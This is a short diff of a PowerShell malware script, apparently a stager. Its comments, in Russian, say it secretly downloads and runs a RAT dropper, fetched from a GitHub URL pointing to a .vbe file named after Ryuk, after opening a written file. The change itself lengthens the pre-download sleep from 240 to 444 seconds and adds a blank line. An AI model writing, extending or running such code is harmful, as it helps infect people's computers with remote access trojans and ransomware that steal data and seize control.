@@ -136,7 +136,7 @@ $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
 
 # ЗАДЕРЖКА
-Start-Sleep -Seconds 240
+Start-Sleep -Seconds 444
 
 # СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
 $Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
@@ -157,5 +157,6 @@ try {
 catch {
 	
 }
+
 
 exit
